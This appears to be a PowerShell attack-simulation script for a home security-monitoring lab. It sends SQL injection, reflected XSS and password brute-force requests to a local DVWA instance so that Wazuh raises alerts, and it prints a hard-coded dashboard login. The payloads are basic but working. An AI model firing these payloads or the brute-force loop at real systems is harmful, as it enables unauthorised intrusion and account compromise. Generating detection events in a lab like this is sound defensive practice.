#!/usr/bin/env pwsh
# ============================================================================
# Mini SOC - Attack Simulator Script (Windows PowerShell)
# ============================================================================
# Purpose: Execute automated attack scenarios for demonstration
# Usage: .\attack-windows.ps1
# ============================================================================

# Configuration
$DVWA_URL = "http://localhost:8080"
$ATTACK_DELAY = 2

# Colors
function Write-Info { Write-Host $args -ForegroundColor Cyan }
function Write-Success { Write-Host $args -ForegroundColor Green }
function Write-Error-Custom { Write-Host $args -ForegroundColor Red }
function Write-Warning { Write-Host $args -ForegroundColor Yellow }

# Banner
Write-Host "═══════════════════════════════════════════════════════════════════════" -ForegroundColor Magenta
Write-Host "  Mini SOC - Automated Attack Simulator (Windows)" -ForegroundColor Magenta
Write-Host "═══════════════════════════════════════════════════════════════════════" -ForegroundColor Magenta
Write-Host ""

# Check if DVWA is accessible
Write-Info "[*] Checking DVWA connectivity..."
try {
    $response = Invoke-WebRequest -Uri $DVWA_URL -UseBasicParsing -ErrorAction Stop
    Write-Success "[+] DVWA is accessible"
} catch {
    Write-Error-Custom "[!] Cannot reach DVWA at $DVWA_URL"
    Write-Error-Custom "[!] Make sure to run: docker compose up -d"
    exit 1
}

Write-Host ""
Write-Host "Select attack scenarios to execute:" -ForegroundColor Cyan
Write-Host "1. SQL Injection (SQLi)" -ForegroundColor White
Write-Host "2. Cross-Site Scripting (XSS)" -ForegroundColor White
Write-Host "3. File Upload" -ForegroundColor White
Write-Host "4. Brute Force" -ForegroundColor White
Write-Host "5. All Attacks" -ForegroundColor White
Write-Host "6. Exit" -ForegroundColor White
Write-Host ""

$choice = Read-Host "Enter your choice (1-6)"

function Test-WebRequest {
    param(
        [string]$URL,
        [string]$Description
    )
    try {
        $response = Invoke-WebRequest -Uri $URL -UseBasicParsing -ErrorAction SilentlyContinue
        Write-Success "[+] $Description - Response: $($response.StatusCode)"
        return $response.StatusCode -eq 200
    } catch {
        Write-Warning "[!] $Description - Failed (this is expected)"
        return $false
    }
}

switch ($choice) {
    "1" {
        Write-Host ""
        Write-Warning "[*] Starting SQL Injection attacks..."
        Write-Host ""
        
        # Attack 1
        Write-Info "[*] Attack 1: Authentication Bypass"
        $payload = "admin' OR '1'='1"
        $encoded = [System.Web.HttpUtility]::UrlEncode($payload)
        Test-WebRequest -URL "$DVWA_URL/vulnerabilities/sqli/?id=$encoded" -Description "Authentication Bypass"
        Write-Success "[+] Payload sent: $payload"
        Start-Sleep -Seconds $ATTACK_DELAY
        
        # Attack 2
        Write-Host ""
        Write-Info "[*] Attack 2: UNION-based SQLi"
        $payload = "1' UNION SELECT user(),database() --"
        $encoded = [System.Web.HttpUtility]::UrlEncode($payload)
        Test-WebRequest -URL "$DVWA_URL/vulnerabilities/sqli/?id=$encoded" -Description "UNION-based SQLi"
        Write-Success "[+] Payload sent: $payload"
        Start-Sleep -Seconds $ATTACK_DELAY
        
        # Attack 3
        Write-Host ""
        Write-Info "[*] Attack 3: Data Extraction"
        $payload = "1' OR '1'='1' --"
        $encoded = [System.Web.HttpUtility]::UrlEncode($payload)
        Test-WebRequest -URL "$DVWA_URL/vulnerabilities/sqli/?id=$encoded" -Description "Data Extraction"
        Write-Success "[+] Payload sent: $payload"
        Start-Sleep -Seconds $ATTACK_DELAY
        
        Write-Host ""
        Write-Success "[+] SQL Injection attacks completed"
        Write-Warning "[*] Check Wazuh Dashboard for alerts"
        Write-Host ""
        Write-Host "Next steps:" -ForegroundColor Cyan
        Write-Host "1. Open: http://localhost:5601" -ForegroundColor White
        Write-Host "2. Login: admin / SecurePassword123!" -ForegroundColor White
        Write-Host "3. Go to: Security Events" -ForegroundColor White
        Write-Host ""
    }
    
    "2" {
        Write-Host ""
        Write-Warning "[*] Starting Cross-Site Scripting attacks..."
        Write-Host ""
        
        # Attack 1
        Write-Info "[*] Attack 1: Basic Script Injection"
        $payload = "<script>alert('XSS Test')</script>"
        $encoded = [System.Web.HttpUtility]::UrlEncode($payload)
        Test-WebRequest -URL "$DVWA_URL/vulnerabilities/xss_reflected/?name=$encoded" -Description "Script Injection"
        Write-Success "[+] Payload sent: $payload"
        Start-Sleep -Seconds $ATTACK_DELAY
        
        # Attack 2
        Write-Host ""
        Write-Info "[*] Attack 2: Event Handler Injection"
        $payload = "<img src=x onerror=alert('XSS')>"
        $encoded = [System.Web.HttpUtility]::UrlEncode($payload)
        Test-WebRequest -URL "$DVWA_URL/vulnerabilities/xss_reflected/?name=$encoded" -Description "Event Handler"
        Write-Success "[+] Payload sent: $payload"
        Start-Sleep -Seconds $ATTACK_DELAY
        
        # Attack 3
        Write-Host ""
        Write-Info "[*] Attack 3: Cookie Stealer"
        $payload = "<script>alert(document.cookie)</script>"
        $encoded = [System.Web.HttpUtility]::UrlEncode($payload)
        Test-WebRequest -URL "$DVWA_URL/vulnerabilities/xss_reflected/?name=$encoded" -Description "Cookie Stealer"
        Write-Success "[+] Payload sent: $payload"
        Start-Sleep -Seconds $ATTACK_DELAY
        
        Write-Host ""
        Write-Success "[+] XSS attacks completed"
        Write-Warning "[*] Check Wazuh Dashboard for alerts"
        Write-Host ""
    }
    
    "3" {
        Write-Host ""
        Write-Warning "[*] Starting File Upload attacks..."
        Write-Host ""
        
        Write-Info "[*] Attempting file upload..."
        Write-Warning "[!] Note: File upload requires additional setup"
        Write-Host ""
        Write-Host "To test file upload:" -ForegroundColor Cyan
        Write-Host "1. Manual: Go to http://localhost:8080/vulnerabilities/upload/" -ForegroundColor White
        Write-Host "2. Try uploading a file" -ForegroundColor White
        Write-Host "3. Monitor logs for detection" -ForegroundColor White
        Write-Host ""
    }
    
    "4" {
        Write-Host ""
        Write-Warning "[*] Starting Brute Force attacks..."
        Write-Host ""
        
        $passwords = @("password", "12345", "admin123", "letmein", "welcome")
        
        foreach ($password in $passwords) {
            Write-Info "[*] Attempting login with password: $password"
            $body = @{
                username = "admin"
                password = $password
                Login = "Login"
            } | ConvertTo-Json
            
            try {
                Invoke-WebRequest `
                    -Uri "$DVWA_URL/vulnerabilities/brute/" `
                    -Method POST `
                    -ContentType "application/x-www-form-urlencoded" `
                    -Body "username=admin&password=$password&Login=Login" `
                    -UseBasicParsing `
                    -ErrorAction SilentlyContinue | Out-Null
                
                Write-Success "[+] Request sent"
            } catch {
                Write-Warning "[!] Request failed (expected)"
            }
            
            Start-Sleep -Seconds $ATTACK_DELAY
            Write-Host ""
        }
        
        Write-Success "[+] Brute Force attacks completed"
        Write-Warning "[*] Check Wazuh Dashboard for multiple failed login attempts"
        Write-Host ""
    }
    
    "5" {
        Write-Host ""
        Write-Warning "[*] Running ALL attacks..."
        Write-Host ""
        
        # SQL Injection
        Write-Host "Phase 1: SQL Injection" -ForegroundColor Magenta
        Write-Host "════════════════════════════════════════" -ForegroundColor Magenta
        $payloads_sqli = @(
            "admin' OR '1'='1",
            "1' UNION SELECT user(),database() --",
            "1' OR '1'='1' --"
        )
        
        foreach ($payload in $payloads_sqli) {
            $encoded = [System.Web.HttpUtility]::UrlEncode($payload)
            Test-WebRequest -URL "$DVWA_URL/vulnerabilities/sqli/?id=$encoded" -Description "SQLi: $payload"
            Start-Sleep -Seconds 2
        }
        
        # XSS
        Write-Host ""
        Write-Host "Phase 2: XSS Attacks" -ForegroundColor Magenta
        Write-Host "════════════════════════════════════════" -ForegroundColor Magenta
        $payloads_xss = @(
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>"
        )
        
        foreach ($payload in $payloads_xss) {
            $encoded = [System.Web.HttpUtility]::UrlEncode($payload)
            Test-WebRequest -URL "$DVWA_URL/vulnerabilities/xss_reflected/?name=$encoded" -Description "XSS: $payload"
            Start-Sleep -Seconds 2
        }
        
        # Brute Force
        Write-Host ""
        Write-Host "Phase 3: Brute Force" -ForegroundColor Magenta
        Write-Host "════════════════════════════════════════" -ForegroundColor Magenta
        $passwords = @("password", "12345", "admin123")
        
        foreach ($password in $passwords) {
            try {
                Invoke-WebRequest `
                    -Uri "$DVWA_URL/vulnerabilities/brute/" `
                    -Method POST `
                    -Body "username=admin&password=$password&Login=Login" `
                    -UseBasicParsing `
                    -ErrorAction SilentlyContinue | Out-Null
                
                Write-Success "[+] Brute force attempt: $password"
            } catch { }
            Start-Sleep -Seconds 2
        }
        
        Write-Host ""
        Write-Host "════════════════════════════════════════" -ForegroundColor Magenta
        Write-Success "[+] ALL ATTACKS COMPLETED!"
        Write-Host ""
        Write-Host "Total Attacks Executed:" -ForegroundColor Cyan
        Write-Host "  - SQL Injection: 3 attacks" -ForegroundColor White
        Write-Host "  - XSS: 3 attacks" -ForegroundColor White
        Write-Host "  - Brute Force: 3 attempts" -ForegroundColor White
        Write-Host "  - Total: 9 events" -ForegroundColor White
        Write-Host ""
        Write-Warning "[*] Waiting 15 seconds for alerts to be generated..."
        Start-Sleep -Seconds 15
        Write-Host ""
        Write-Success "[+] Check Wazuh Dashboard: http://localhost:5601"
        Write-Host ""
    }
    
    "6" {
        Write-Host "Exiting..." -ForegroundColor Yellow
        exit 0
    }
    
    default {
        Write-Error-Custom "Invalid choice!"
        exit 1
    }
}

# Final instructions
Write-Host ""
Write-Host "═══════════════════════════════════════════════════════════════════════" -ForegroundColor Magenta
Write-Host "MONITORING INSTRUCTIONS" -ForegroundColor Magenta
Write-Host "═══════════════════════════════════════════════════════════════════════" -ForegroundColor Magenta
Write-Host ""
Write-Host "Option 1: View Docker Logs (Real-time)" -ForegroundColor Cyan
Write-Host "  docker compose logs -f nginx            # Nginx access logs" -ForegroundColor White
Write-Host "  docker compose logs -f wazuh-manager    # Wazuh alerts" -ForegroundColor White
Write-Host ""
Write-Host "Option 2: View Wazuh Dashboard (Best)" -ForegroundColor Cyan
Write-Host "  1. Open: http://localhost:5601" -ForegroundColor White
Write-Host "  2. Login: admin / SecurePassword123!" -ForegroundColor White
Write-Host "  3. Go to: Security Events" -ForegroundColor White
Write-Host ""
Write-Host "Option 3: View Container Logs Directly" -ForegroundColor Cyan
Write-Host "  docker compose exec wazuh-manager tail -f /var/ossec/logs/alerts/alerts.json" -ForegroundColor White
Write-Host "  docker compose exec nginx tail -f /var/log/nginx/access.log" -ForegroundColor White
Write-Host ""
Write-Host "═══════════════════════════════════════════════════════════════════════" -ForegroundColor Magenta
